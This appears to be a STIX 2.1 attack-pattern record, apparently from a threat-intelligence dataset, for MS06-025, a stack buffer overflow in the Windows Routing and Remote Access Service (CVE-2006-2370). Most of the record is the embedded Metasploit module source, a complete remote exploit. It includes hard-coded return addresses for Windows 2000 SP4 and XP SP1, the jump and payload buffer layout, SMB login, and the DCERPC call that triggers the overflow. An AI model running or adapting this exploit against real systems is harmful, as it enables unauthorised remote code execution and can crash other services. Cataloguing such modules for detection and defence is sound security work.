{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ef935d20-2fdb-4790-9815-25c05f1d172f",
    "created": "2024-08-14T16:56:23.216205Z",
    "modified": "2024-08-14T16:56:23.216209Z",
    "name": "MS06-025 Microsoft RRAS Service Overflow",
    "description": " This module exploits a stack buffer overflow in the Windows Routing and Remote Access Service. Since the service is hosted inside svchost.exe, a failed exploit attempt can cause other system services to fail as well. A valid username and password is required to exploit this flaw on Windows 2000. When attacking XP SP1, the SMBPIPE option needs to be set to 'SRVSVC'.\t\t\t",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms06_025_rras.rb",
            "external_id": "ms06_025_rras.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-2370"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS06-025 Microsoft RRAS Service Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the Windows Routing and Remote\n        Access Service. Since the service is hosted inside svchost.exe, a failed\n        exploit attempt can cause other system services to fail as well. A valid\n        username and password is required to exploit this flaw on Windows 2000.\n        When attacking XP SP1, the SMBPIPE option needs to be set to 'SRVSVC'.\t\t\t},\n      'Author'         =>\n        [\n          'Nicolas Pouvesle <nicolas.pouvesle[at]gmail.com>',\n          'hdm'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-2370' ],\n          [ 'OSVDB', '26437' ],\n          [ 'BID', '18325' ],\n          [ 'MSB', 'MS06-025' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1104,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows 2000 SP4', { 'Ret' => 0x7571c1e4 } ],\n          [ 'Windows XP SP1',   { 'Ret' => 0x7248d4cc } ],\n        ],\n\n      'DisclosureDate' => '2006-06-13'))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use (ROUTER, SRVSVC)\", 'ROUTER']),\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  # Post authentication bugs are rarely useful during automation\n  def autofilter\n    false\n  end\n\n  def exploit\n\n    connect(versions: [1])\n    smb_login()\n\n    handle = dcerpc_handle('20610036-fa22-11cf-9823-00a0c911e5df', '1.0', 'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"])\n\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n\n    print_status('Getting OS...')\n\n    # Check the remote OS name and version\n    os = smb_peer_os\n    pat = ''\n\n    case os\n    when /Windows 5\\.0/\n      pat =\n        payload.encoded +\n        \"\\xeb\\x06\" +\n        rand_text_alphanumeric(2) +\n        [target.ret].pack('V') +\n        \"\\xe9\\xb7\\xfb\\xff\\xff\"\n      os = 'Windows 2000'\n    when /Windows 5\\.1/\n      pat =\n        rand_text_alphanumeric(0x4c) +\n        \"\\xeb\\x06\" +\n        rand_text_alphanumeric(2) +\n        [target.ret].pack('V') +\n        payload.encoded\n      os = 'Windows XP'\n    end\n\n    req = [1, 0x49].pack('VV') + pat + rand_text_alphanumeric(0x4000-pat.length)\n    len = req.length\n    stb =\n      NDR.long(0x20000) +\n      NDR.long(len) +\n      req           +\n      NDR.long(len)\n\n    print_status(\"Calling the vulnerable function on #{os}...\")\n\n    begin\n      dcerpc.call(0x0C, stb)\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n    rescue => e\n      if e.to_s !~ /STATUS_PIPE_DISCONNECTED/\n        raise e\n      end\n    end\n\n    # Cleanup\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-06-13",
    "x_mitre_platforms": [
        "win'"
    ]
}